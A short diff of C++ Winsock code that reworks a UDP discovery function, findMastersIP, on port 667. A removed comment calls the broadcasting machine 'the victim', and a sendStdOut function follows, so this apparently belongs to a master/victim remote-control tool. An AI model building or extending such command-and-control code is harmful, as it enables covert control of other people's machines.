@@ -20,14 +20,16 @@ uint32_t findMastersIP()
 
     std::string message, response;
     char* buf = new char[65536];
-    int fromlen = sizeof(mastersinfo);
+    int fromlen;
 
     sockinfo.sin_addr.s_addr = getPrivateIP();
     sockinfo.sin_port = htons(667);
     sockinfo.sin_family = AF_INET;
 
+    fromlen = sizeof(sockinfo);
+
     error = 1;
-    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&error, sizeof(error)))
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&error, sizeof(error))<0)
         std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
 
     if(bind(s, (sockaddr*)&sockinfo, sizeof sockinfo) < 0)
@@ -39,18 +41,15 @@ uint32_t findMastersIP()
 
     /*wait for the master to ask me to connect*/
     do {
-        error = recvfrom(s, buf, 65536, 0, (sockaddr*)&mastersinfo, &fromlen);
+        ZeroMemory(buf, 65536);
+        error = recvfrom(s, buf, 65536, 0, (sockaddr*)&sockinfo, &fromlen);
+        std::cout << buf;
         if (error < 0)
         {
             std::cout << "Recieve error <" << WSAGetLastError() << ">" << std::endl;
             goto errorLable;
         }
     } while (!std::string(buf)._Equal(message));
-
-    /*the victim will broadcast to port 667 that he needs the master's ip*/
-    sockinfo.sin_addr.s_addr = mastersinfo.sin_addr.s_addr;
-    sockinfo.sin_port = mastersinfo.sin_port;
-    sockinfo.sin_family = mastersinfo.sin_family;
 
     error = sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
     if (error < 0)
@@ -59,7 +58,7 @@ uint32_t findMastersIP()
 errorLable:
     delete[] buf;
     closesocket(s);
-    return mastersinfo.sin_addr.s_addr;
+    return sockinfo.sin_addr.s_addr;
 }
 
 int sendStdOut(SOCKET s, std::string& message)
